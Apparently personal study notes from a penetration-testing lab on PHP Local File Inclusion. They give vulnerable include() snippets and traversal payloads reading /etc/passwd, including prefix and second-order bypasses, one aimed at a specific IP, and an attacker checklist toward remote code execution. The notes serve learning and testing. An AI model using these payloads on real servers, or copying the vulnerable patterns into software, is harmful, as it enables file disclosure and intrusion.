

Local File Inclusion (LFI) occurs when a web application includes files on the server based on **user-controlled input** without proper validation.  
This allows attackers to **read local files** and sometimes escalate to **Remote Code Execution (RCE)**.

Typical vulnerable code (PHP):

```php
include($_GET['language']);
```

---

## 2. Basic LFI

Example vulnerable URL:

```
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```

Test by replacing parameter with a local file:

```
index.php?language=/etc/passwd
```

Common target files:

- Linux: `/etc/passwd`
- Windows: `C:\Windows\boot.ini`

---

## 3. Path Traversal

If input is appended to a directory:

```php
include("./languages/" . $_GET['language']);
```

Direct file read fails:

```
index.php?language=/etc/passwd

# it will append the directory before it, and it will fail
./languages//etc/passwd
```

Bypass using directory traversal:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

Notes:

- `../` moves one directory up
- Extra `../` does NOT break traversal (root stays `/`)
- Try minimal required traversal for clean exploitation


Example
`http://83.136.251.11:34929/index.php?language=../../../../../../../../../../etc/passwd`
![[Pasted image 20251218153053.png]]
![[Pasted image 20251218153224.png]]

---

## 4. Filename Prefix Bypass

If application prepends a prefix:

```php
include("lang_" . $_GET['language']);
```

Payload:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd

lang_../../../etc/passwd ❌

# fails because what the fuck is lang_..
```

Bypass using absolute path trick:

```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd

index.php?language=/../../../etc/passwd

lang_/../../etc/passwd
# only works if there is a directory lang_
```

Works by treating prefix as a directory.

---

## 5. Appended Extension Issue

If extension is appended:

```php
include($_GET['language'] . ".php");
```

Payload fails:

```
/etc/passwd.php ❌

# but using this we can successfully read/render other php files
```

Requires bypass techniques:

- PHP wrappers
- Filters
- Upload + LFI
- Log poisoning

(Handled in later stages)

---

## 6. Second-Order LFI

Occurs when:

- User input is stored (DB, profile, filename)
- Another functionality later uses that value in file inclusion

Example:

```
# A function downloads a image using the username/data stored in database

/profile/<username>/avatar.png
```

Malicious username:

```
../../../etc/passwd
```

Attack flow:

1. Poison stored value
2. Trigger file inclusion elsewhere
3. Read arbitrary files

Key point:  
**Trusted database values can still be attacker-controlled**

---

## 7. Why LFI Is Dangerous

LFI enables:

- File disclosure
- User enumeration
- Configuration leaks
- Credential harvesting
- RCE (with chaining)

Often combined with:

- Log poisoning
- File upload
- PHP wrapper
- Filters

---

## 8. Attacker Mindset

Checklist:

- Identify file include parameters
- Test absolute paths
- Test traversal (`../`)
- Check for prefixes/extensions
- Look for second-order usage
- Chain to RCE

---

## 9. Key Takeaway

> **LFI is rarely the end goal.  
> It is a stepping stone to full compromise.**

If you can read files, you can usually escalate.